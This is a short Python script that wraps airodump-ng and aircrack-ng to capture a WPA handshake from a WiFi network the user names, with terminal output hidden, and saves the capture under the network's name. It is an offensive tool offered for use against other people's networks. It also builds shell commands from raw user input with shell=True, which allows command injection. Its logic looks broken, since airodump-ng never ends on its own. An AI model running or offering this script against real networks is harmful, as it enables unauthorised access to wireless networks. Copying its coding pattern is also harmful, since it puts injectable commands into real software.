# Capture HandShake file going to be here

import subprocess

while True:
    # Input the target WiFi network
    wifi_ssid = input("Enter the target WiFi SSID: ")

    # Run airodump-ng to capture the handshake without terminal output
    subprocess.run(f"airodump-ng --essid {wifi_ssid} -w capture_file wlan0", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Once you capture the handshake, stop the process without terminal output
    result = subprocess.run("aircrack-ng capture_file-01.cap", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    # Check if handshake capture was successful
    if "1 handshake" in result.stdout.decode():
        # Save the handshake to a file
        subprocess.run(f"mv capture_file-01.cap {wifi_ssid}_handshake.cap", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        print(f"Handshake capture for {wifi_ssid} successful!")
        break  # Exit the loop once handshake is captured
